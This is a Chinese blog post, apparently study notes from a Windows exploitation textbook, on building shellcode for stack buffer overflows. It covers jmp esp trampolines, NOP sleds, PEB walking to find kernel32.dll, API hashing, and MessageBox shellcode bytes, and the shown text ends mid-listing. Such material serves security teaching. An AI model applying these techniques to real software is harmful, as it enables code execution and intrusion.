<!DOCTYPE html>



  


<html class="theme-next muse use-motion" lang="chinese">
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="0day安全,">










<meta name="description" content="shellcode 这个专用术语来通称缓冲区溢出攻击中植入进程的代码">
<meta name="keywords" content="0day安全">
<meta property="og:type" content="article">
<meta property="og:title" content="开发shellcode的艺术">
<meta property="og:url" content="http://yoursite.com/2019/07/31/开发shellcode的艺术/index.html">
<meta property="og:site_name" content="loser的博客">
<meta property="og:description" content="shellcode 这个专用术语来通称缓冲区溢出攻击中植入进程的代码">
<meta property="og:locale" content="chinese">
<meta property="og:image" content="http://yoursite.com/2019/07/31/开发shellcode的艺术/1.png">
<meta property="og:image" content="http://yoursite.com/2019/07/31/开发shellcode的艺术/2.png">
<meta property="og:image" content="http://yoursite.com/2019/07/31/开发shellcode的艺术/3.png">
<meta property="og:image" content="http://yoursite.com/2019/07/31/开发shellcode的艺术/4.png">
<meta property="og:image" content="http://yoursite.com/2019/07/31/开发shellcode的艺术/5.png">
<meta property="og:image" content="http://yoursite.com/2019/07/31/开发shellcode的艺术/6.png">
<meta property="og:image" content="http://yoursite.com/2019/07/31/开发shellcode的艺术/7.png">
<meta property="og:image" content="http://yoursite.com/2019/07/31/开发shellcode的艺术/8.png">
<meta property="og:image" content="http://yoursite.com/2019/07/31/开发shellcode的艺术/9.png">
<meta property="og:image" content="http://yoursite.com/2019/07/31/开发shellcode的艺术/10.png">
<meta property="og:image" content="http://yoursite.com/2019/07/31/开发shellcode的艺术/11.png">
<meta property="og:image" content="http://yoursite.com/2019/07/31/开发shellcode的艺术/12.png">
<meta property="og:image" content="http://yoursite.com/2019/07/31/开发shellcode的艺术/13.png">
<meta property="og:image" content="http://yoursite.com/2019/07/31/开发shellcode的艺术/14.png">
<meta property="og:updated_time" content="2019-08-01T07:33:36.955Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="开发shellcode的艺术">
<meta name="twitter:description" content="shellcode 这个专用术语来通称缓冲区溢出攻击中植入进程的代码">
<meta name="twitter:image" content="http://yoursite.com/2019/07/31/开发shellcode的艺术/1.png">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: 'Author'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/2019/07/31/开发shellcode的艺术/">





  <title>开发shellcode的艺术 | loser的博客</title>
  








</head>

<body itemscope="" itemtype="http://schema.org/WebPage" lang="chinese">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">loser的博客</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            Home
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
            
            Tags
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
            
            Categories
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            Archives
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/31/开发shellcode的艺术/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="loser">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="loser的博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">开发shellcode的艺术</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-31T08:57:18+08:00">
                2019-07-31
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <p>shellcode 这个专用术语来通称缓冲区溢出攻击中植入进程的代码<br><a id="more"></a></p>
<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><h2 id="shellcode-与exploit"><a href="#shellcode-与exploit" class="headerlink" title="shellcode 与exploit"></a>shellcode 与exploit</h2><p>shellcode 往往需要用汇编语言编写，并转换成二进制机器码，其内容和长度经常还会受到很多苛刻限制，开发和调试的难度很高。</p>
<p>调试之后还要计算函数返回地址距离缓冲区的偏移并淹没之，选择指令的地址，最终制作出一个有攻击效果的“承载”着shellcode 的输入字符串。这个代码植入的过程就是漏洞利用，也就是exploit</p>
<p>exploit 一般以一段代码的形式出现，用于生成攻击性的网络数据包或者其他形式的攻击性输入。expliot 的核心是淹没返回地址，劫持进程的控制权，之后跳转去执行shellcode</p>
<p>与shellcode具有一定的通用性不同，exploit 往往是针对特定漏洞而言的</p>
<h1 id="定位shellcode"><a href="#定位shellcode" class="headerlink" title="定位shellcode"></a>定位shellcode</h1><h2 id="栈帧移位与jmp-esp"><a href="#栈帧移位与jmp-esp" class="headerlink" title="栈帧移位与jmp esp"></a>栈帧移位与jmp esp</h2><p>在实际的漏洞利用过程中，由于动态链接库的装入和卸载等原因，Windows 进程的函数栈帧很有可能会产生“移位”，即shellcode 在内存中的地址是会动态变化的</p>
<p>一般情况下，ESP 寄存器中的地址总是指向系统栈中且不会被溢出的数据破坏。函数返回时，ESP 所指的位置恰好是我们所淹没的返回地址的下一个位置</p>
<p><img src="1.png" alt=""><br>由于ESP 寄存器在函数返回后不被溢出数据干扰，且始终指向返回地址之后的位置，我们可以使用图所示的这种定位shellcode 的方法来进行动态定位</p>
<p>（1）用内存中任意一个jmp esp 指令的地址覆盖函数返回地址，而不是原来用手工查出的shellcode 起始地址直接覆盖。</p>
<p>（2）函数返回后被重定向去执行内存中的这条jmp esp 指令，而不是直接开始执行shellcode。</p>
<p>（3）由于esp 在函数返回时仍指向栈区（函数返回地址之后），jmp esp 指令被执行后，处理器会到栈区函数返回地址之后的地方取指令执行。</p>
<p>（4）重新布置shellcode。在淹没函数返回地址后，继续淹没一片栈空间。将缓冲区前边一段地方用任意数据填充，把shellcode 恰好摆放在函数返回地址之后。这样，jmp esp 指令执行过后会恰好跳进shellcode</p>
<p>这种定位 shellcode 的方法使用进程空间里一条jmp esp 指令作为“跳板”，不论栈帧怎么“移位”，都能够精确地跳回栈区，从而适应程序运行中shellcode 内存地址的动态变化。</p>
<h2 id="获取“跳板”的地址"><a href="#获取“跳板”的地址" class="headerlink" title="获取“跳板”的地址"></a>获取“跳板”的地址</h2><p>2.4 节实验（昨天那个文章的最后一个程序）中的有漏洞的密码验证程序已经加载了user32.dll，所以我们准备使用user32.dll中的jmp esp 作为跳板。获得user32.dll 内跳转指令地址最直观的方法就是编程序搜索内存。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#define DLL_NAME &quot;user32.dll&quot;</span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">	BYTE* ptr;</span><br><span class="line">	int position,address;</span><br><span class="line">	HINSTANCE handle;</span><br><span class="line">	BOOL done_flag = FALSE;</span><br><span class="line">	handle=LoadLibrary(DLL_NAME);</span><br><span class="line">	if(!handle)</span><br><span class="line">	&#123;</span><br><span class="line">		printf(&quot; load dll erro !&quot;);</span><br><span class="line">		exit(0);</span><br><span class="line">	&#125;</span><br><span class="line">	ptr = (BYTE*)handle;</span><br><span class="line">	for(position = 0; !done_flag; position++)</span><br><span class="line">	&#123;</span><br><span class="line">		try</span><br><span class="line">		&#123;</span><br><span class="line">			if(ptr[position] == 0xFF &amp;&amp; ptr[position+1] == 0xE4)</span><br><span class="line">			&#123;</span><br><span class="line">				//0xFFE4 is the opcode of jmp esp</span><br><span class="line">				int address = (int)ptr + position;</span><br><span class="line">				printf(&quot;OPCODE found at 0x%x\n&quot;,address);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	catch(...)</span><br><span class="line">	&#123;</span><br><span class="line">		int address = (int)ptr + position;</span><br><span class="line">		printf(&quot;END OF 0x%x\n&quot;, address);</span><br><span class="line">		done_flag = true;</span><br><span class="line">	&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>jmp esp 对应的机器码是0xFFE4，上述程序的作用就是从user32.dll 在内存中的基地址开始向后搜索0xFFE4，如果找到就返回其内存地址（指针值）。</p>
<p>下来使用OD的插件进行查找指令<br><img src="2.png" alt=""></p>
<h2 id="使用“跳板”定位的exploit"><a href="#使用“跳板”定位的exploit" class="headerlink" title="使用“跳板”定位的exploit"></a>使用“跳板”定位的exploit</h2><p>我们运行自己编写的程序搜索跳转地址得到与OD插件搜索到的基本一样<br><img src="3.png" alt=""><br>采用位于内存0x77D93AC8 处的跳转地址jmp esp 作为定位shellcode 的“跳板”</p>
<p>在制作exploit 的时候，还应当修复2.4 节中shellcode 无法正常退出的缺陷。为此，我们在调用MessageBox 之后，通过调用exit 函数让程序干净利落地退出。</p>
<p>我们最总得到函数的入口内存地址为7C81BFA2<br><img src="4.png" alt=""><br>写出的shellcode 的源代码如下所示。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	HINSTANCE LibHandle;</span><br><span class="line">	char dllbuf[11] = &quot;user32.dll&quot;;</span><br><span class="line">	LibHandle = LoadLibrary(dllbuf);</span><br><span class="line">	_asm&#123;</span><br><span class="line">		sub sp,0x440</span><br><span class="line">		xor ebx,ebx</span><br><span class="line">		push ebx // cut string</span><br><span class="line">		push 0x74736577</span><br><span class="line">		push 0x6C696166//push failwest</span><br><span class="line">		mov eax,esp //load address of failwest</span><br><span class="line">		push ebx</span><br><span class="line">		push eax</span><br><span class="line">		push eax</span><br><span class="line">		push ebx</span><br><span class="line">		mov eax,0x77D804EA // address should be reset in different OS</span><br><span class="line">		call eax //call MessageboxA</span><br><span class="line">		push ebx</span><br><span class="line">		mov eax,0x7C81CDDA</span><br><span class="line">		call eax //call exit(0)</span><br><span class="line">		&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>我们用vs编译成可执行文件 然后在OD中找到对应汇编指令的机器代码<br><img src="5.png" alt=""><br><img src="6.png" alt=""><br>下来就是制作对应的机器代码文件了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">33 DB XOR EBX,EBX</span><br><span class="line">53 PUSH EBX</span><br><span class="line">68 77 65 73 74 PUSH 74736577</span><br><span class="line">68 66 61 69 6C PUSH 6C696166			压入NULL 结尾的“failwest”字符串。之所以用EBX 清零后入栈作为字符串的截断符，是为了避免“PUSH 0”中的NULL，否则植入的机器码会被strcpy函数截断</span><br><span class="line">8B C4 MOV EAX,ESP 						EAX 里是字符串指针</span><br><span class="line">53 PUSH EBX</span><br><span class="line">50 PUSH EAX</span><br><span class="line">50 PUSH EAX</span><br><span class="line">53 PUSH EBX								4 个参数按照从右向左的顺序入栈， 分别为(0,failwest,failwest,0)消息框为默认风格，文本区和标题都是“failwest”</span><br><span class="line">B8 EA 04 D8 77 MOV EAX, 0x77D507EA</span><br><span class="line">FF D0 CALL EAX							调用MessageBoxA。注意：不同的机器这里的函数入口地址可能不同，请按实际值填入</span><br><span class="line">53 PUSH EBX</span><br><span class="line">B8 DA CD 81 7C MOV EAX, 0x7C81BFA2</span><br><span class="line">FF D0 CALL EAX							调用exit(0)。注意：不同的机器这里的函数入口地址可能不同，请按实际值填入</span><br></pre></td></tr></table></figure></p>
<p>我们将机器代码写入文件之中<br><img src="7.png" alt=""><br>接下来运行程序就不会报错了 而且还是同样的程序框</p>
<h1 id="缓冲区的组织"><a href="#缓冲区的组织" class="headerlink" title="缓冲区的组织"></a>缓冲区的组织</h1><h2 id="缓冲区的组成"><a href="#缓冲区的组成" class="headerlink" title="缓冲区的组成"></a>缓冲区的组成</h2><p>如果选用jmp esp 作为定位shellcode 的跳板，那么在函数返回后要根据缓冲区大小、所需shellcode 长短等实际情况灵活地布置缓冲区。送入缓冲区的数据可以分为以下几种。</p>
<p>（1）填充物：可以是任何值，但是一般用NOP 指令对应的0x90 来填充缓冲区，并把shellcode布置于其后。这样即使不能准确地跳转到shellcode 的开始，只要能跳进填充区，处理器最终也能顺序执行到shellcode。</p>
<p>（2）淹没返回地址的数据：可以是跳转指令的地址、shellcode 起始地址，甚至是一个近似的 shellcode 的地址。</p>
<p>（3）shellcode：可执行的机器代码。</p>
<p>2.4节我们将shellcode放在了缓冲区中 3.2皆我们用jmp esp来定位shellcode shellcode布置在函数返回地址之后的好处（不用担心自身被压栈数据破坏）。但是，超过函数返回地址以后将是前栈帧数据（栈的方向，内存高址），而一个实用的shellcode 往往需要几百个字节，这样大范围地破坏前栈帧数据有可能引发一些其他问题。例如，若想在执行完shellcode 后通过修复寄存器的值，让函数正常返回继续执行原程序，就不能随意破坏前栈帧的数据。</p>
<p><img src="8.png" alt=""><br>放在缓冲区的好处：<br>（1）合理利用缓冲区，使攻击串的总长度减小：对于远程攻击，有时所有数据必须包含在一个数据包中！</p>
<p>（2）对程序破坏小，比较稳定：溢出基本发生在当前栈帧内，不会大范围破坏前栈帧。</p>
<h2 id="抬高栈顶保护shellcode"><a href="#抬高栈顶保护shellcode" class="headerlink" title="抬高栈顶保护shellcode"></a>抬高栈顶保护shellcode</h2><p>将shellcode 布置在缓冲区中虽然有不少好处，但是也会产生问题。函数返回时，当前栈帧被弹出，这时缓冲区位于栈顶ESP 之上的内存区域。在弹出栈帧时只是改变了ESP 寄存器中的值，逻辑上，ESP 以上的内存空间的数据已经作废；物理上，这些数据并没有被销毁。如果shellcode 中没有压栈指令向栈中写入数据还没有太大影响；但如果使用push 指令在栈中暂存数据，压栈数据很可能会破坏到shellcode 本身。这个过程如图所示。</p>
<p>当缓冲区相对shellcode 较大时，把shellcode 布置在缓冲区的“前端”（内存低址方向），这时shellcode 离栈顶较远，几次压栈可能只会破坏到一些填充值nop；但是，如果缓冲区已经被shellcode 占满，则shellcode 离栈顶比较近，这时的情况就比较危险了。</p>
<p><img src="9.png" alt=""><br>为了使shellcode 具有较强的通用性，我们通常会在shellcode 一开始就大范围抬高栈顶，把shellcode“藏”在栈内，从而达到保护自身安全的目的 如下图</p>
<h2 id="使用其他跳转指令"><a href="#使用其他跳转指令" class="headerlink" title="使用其他跳转指令"></a>使用其他跳转指令</h2><p>除了ESP外 还有EAX EBX ESI等继勋奇也会指向栈顶附近 使用这些指令的也可以完成进栈功能</p>
<p><img src="10.png" alt=""></p>
<h3 id="不使用跳转指令"><a href="#不使用跳转指令" class="headerlink" title="不使用跳转指令"></a>不使用跳转指令</h3><p>个别有苛刻的限制条件的漏洞不允许我们使用跳转指令精确定位 shellcode，而使用shellcode 的静态地址来覆盖又不够准确，这时我们可以做一个折中：如果能够淹没大片的内存区域，可以将shellcode 布置在一大段nop 之后。这时定位shellcode 时，只要能跳进这一大片nop 中，shellcode 就可以最终得到执行 如下图：</p>
<p><img src="11.png" alt=""></p>
<h3 id="函数返回地址移位"><a href="#函数返回地址移位" class="headerlink" title="函数返回地址移位"></a>函数返回地址移位</h3><p>和上面差不多 返回地址偏移量也是不确定的 我们也可以这样做！<br><img src="12.png" alt=""></p>
<h1 id="开发通用的shellcode"><a href="#开发通用的shellcode" class="headerlink" title="开发通用的shellcode"></a>开发通用的shellcode</h1><p>然而不同版本的计算机动态链接库的加载基址时不一样的 偏移地址也不同 我们在自己计算机上面适用 在其他计算机可能就失效了 所以 在实际中 我们使用的shellcode必须能够动态的获取自身所需要的API函数地址</p>
<p>Windows 的API 是通过动态链接库中的导出函数来实现的，例如，内存操作等函数在kernel32.dll 中实现；大量的图形界面相关的API 则在user32.dll 中实现。Win_32 平台下的shellcode 使用最广泛的方法，就是通过从进程环境块中找到动态链接库的导出表，并搜索出所需的API 地址，然后逐一调用。</p>
<p>所有win_32 程序都会加载ntdll.dll 和kernel32.dll 这两个最基础的动态链接库。如果想要在win_32 平台下定位kernel32.dll 中的 API 地址，可以采用如下方法。</p>
<p>（1）首先通过段选择字FS 在内存中找到当前的线程环境块TEB。</p>
<p>（2）线程环境块偏移位置为0x30 的地方存放着指向进程环境块PEB 的指针。</p>
<p>（3）进程环境块中偏移位置为0x0C 的地方存放着指向PEB_LDR_DATA 结构体的指针，其中，存放着已经被进程装载的动态链接库的信息。</p>
<p>（4）PEB_LDR_DATA 结构体偏移位置为0x1C 的地方存放着指向模块初始化链表的头指针InInitializationOrderModuleList。</p>
<p>（5）模块初始化链表InInitializationOrderModuleList 中按顺序存放着PE 装入运行时初始化模块的信息，第一个链表结点是ntdll.dll，第二个链表结点就是kernel32.dll。</p>
<p>（6）找到属于kernel32.dll 的结点后，在其基础上再偏移0x08 就是kernel32.dll 在内存中的加载基地址。</p>
<p>（7）从kernel32.dll 的加载基址算起，偏移0x3C 的地方就是其PE 头。</p>
<p>（8）PE 头偏移0x78 的地方存放着指向函数导出表的指针。</p>
<p>（9）至此，我们可以按如下方式在函数导出表中算出所需函数的入口地址，如图所示。</p>
<p>􀁺 导出表偏移0x1C 处的指针指向存储导出函数偏移地址（RVA）的列表。</p>
<p>􀁺 导出表偏移0x20 处的指针指向存储导出函数函数名的列表。</p>
<p>􀁺 函数的RVA 地址和名字按照顺序存放在上述两个列表中，我们可以在名称列表中定位到所需的函数是第几个，然后在地址列表中找到对应的RVA。</p>
<p>􀁺 获得RVA 后，再加上前边已经得到的动态链接库的加载基址，就获得了所需API 此刻在内存中的虚拟地址，这个地址就是我们最终在shellcode 中调用时需要的地址。</p>
<p>按照上面的方法，我们已经可以获得kernel32.dll 中的任意函数。类似地，我们已经具备了定位ws2_32.dll 中的winsock 函数来编写一个能够获得远程shell 的真正的shellcode 了。</p>
<p>其实，在摸透了kernel32.dll 中的所有导出函数之后，结合使用其中的两个函数LoadLibrary()和GetProcAddress()，有时可以让定位所需其他API 的工作变得更加容易。</p>
<p><img src="13.png" alt=""><br>下来就是让shellcode能够完善一些 使他能够适应所有的wen_31平台</p>
<h2 id="shellcode-的加载与调试"><a href="#shellcode-的加载与调试" class="headerlink" title="shellcode 的加载与调试"></a>shellcode 的加载与调试</h2><p>我们常见的shellcode是把机器码存在一个数组中 前面就是这样 这种形式的shellcode可以在C语言在轻易的布置进内存区域 但是如果出了问题 往往很难调试 shellcode往往需要已经初始化好了的进程空间和资源等 故往往不能单独运行 为了能够实际运行中调试这样的机器码，我们可以使用这样一段简单的代码来装载shellcode。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">char shellcode[]=&quot;\x66\x81\xEC\x40\x04\x33\xDB……&quot;;//欲调试的十六</span><br><span class="line">//进制机器码&quot;</span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">__asm</span><br><span class="line">&#123;</span><br><span class="line">lea eax, shellcode</span><br><span class="line">push eax</span><br><span class="line">ret</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ret 指令会将push 进去的shellcode 在栈中的起始地址弹给EIP，让处理器跳转到栈区去执行shellcode</p>
<h2 id="动态定位API-地址的shellcode"><a href="#动态定位API-地址的shellcode" class="headerlink" title="动态定位API 地址的shellcode"></a>动态定位API 地址的shellcode</h2><p>需要的API函数：<br>（1）MessageBoxA 位于user32.dll 中，用于弹出消息框。<br>（2）ExitProcess 位于kernel32.dll 中，用于正常退出程序。<br>（3）LoadLibraryA 位于kernel32.dll 中。并不是所有的程序都会装载user32.dll，所以在我们调用MessageBoxA 之前，应该先使用LoadLibrary(“user32.dll”)装载其所属的动态链接库。</p>
<p>我们可以用前面介绍的方法来找到地址 但shellcode总是要放进缓冲区的 为了让shellcode更加通用 我们得让shellcode尽可能的短 但是导出表的函数名往往很长 我们并不能用“MessageBoxA”这么长的字符串去进行直接比较</p>
<p>我们会对API函数进行hash运算 在搜索导出表时对当前遇到的函数名也进行了同样的bash 这就只需要比较hash所得的值就能判定是不是我们需要的API</p>
<p>hash代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">DWORD GetHash(char *fun_name)</span><br><span class="line">&#123;</span><br><span class="line">	DWORD digest=0;</span><br><span class="line">	while(*fun_name)</span><br><span class="line">	&#123;</span><br><span class="line">		digest=((digest&lt;&lt;25)|(digest&gt;&gt;7)); //循环右移7 位</span><br><span class="line">		digest+= *fun_name ; //累加</span><br><span class="line">		fun_name++;</span><br><span class="line">	&#125;</span><br><span class="line">	return digest;</span><br><span class="line">&#125;</span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">	DWORD hash;</span><br><span class="line">	hash= GetHash(&quot;AddAtomA&quot;);</span><br><span class="line">	printf(&quot;result of hash is %.8x\n&quot;,hash);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>如上述代码，将把字符串中的字符逐一取出，把ASCII 码从单字节转换成四字节的双字（DWORD），循环右移7位之后再进行累积。</p>
<p>上述hash 算法只需要用ror 和add 两条指令就能实现。</p>
<table>
<thead>
<tr>
<th>API函数名</th>
<th style="text-align:center">经过hash运算后得到的结果</th>
</tr>
</thead>
<tbody>
<tr>
<td>MessageBoxA</td>
<td style="text-align:center">0x1e380a6a</td>
</tr>
<tr>
<td>ExitProcess</td>
<td style="text-align:center">0x4fd18963</td>
</tr>
<tr>
<td>LoadLibraryA</td>
<td style="text-align:center">0x0c917432</td>
</tr>
</tbody>
</table>
<p>在将hash 压入栈中之前，注意先将增量标志DF 清零。因为当shellcode 是利用异常处理机制而植入的时候，往往会产生标志位的变化，使shellcode 中的字串处理方向发生变化而产生错误（如指令LODSD）。如果您在堆溢出利用中发现原本身经百战的shellcode 在运行时出错，很可能就是这个原因。总之，一个字节的指令可以大大增加shellcode 的通用性。</p>
<p>现在可以将这些hash 结果压入栈中，并用一个寄存器标识位置，以备后面搜索API 函数时使用。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">;store hash</span><br><span class="line">push 0x1e380a6a ;hash of MessageBoxA</span><br><span class="line">push 0x4fd18963 ;hash of ExitProcess</span><br><span class="line">push 0x0c917432 ;hash of LoadLibraryA</span><br><span class="line">mov esi,esp ;esi = addr of first function hash</span><br><span class="line">lea edi,[esi-0xc] ;edi = addr to start writing function</span><br></pre></td></tr></table></figure>
<p>然后我们需要抬高栈顶，保护shellcode 不被入栈数据破坏。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">;make some stack space</span><br><span class="line">xor ebx,ebx</span><br><span class="line">mov bh, 0x04</span><br><span class="line">sub esp, ebx</span><br></pre></td></tr></table></figure></p>
<p>定位kernel32.dll 的代码如下。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">;find base addr of kernel32.dll</span><br><span class="line">mov ebx, fs:[edx + 0x30]	;ebx = address of PEB</span><br><span class="line">mov ecx, [ebx + 0x0c] 		;ecx = pointer to loader data</span><br><span class="line">mov ecx, [ecx + 0x1c] 		;ecx = first entry in initialisation</span><br><span class="line">							;order list</span><br><span class="line">mov ecx, [ecx] 				;ecx = second entry in list</span><br><span class="line">							;(kernel32.dll)</span><br><span class="line">mov ebp, [ecx + 0x08] 		;ebp = base address of kernel32.dll</span><br></pre></td></tr></table></figure></p>
<p>在导入表中搜索API 的逻辑可以设计如图所示。<br><img src="14.png" alt=""><br>代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 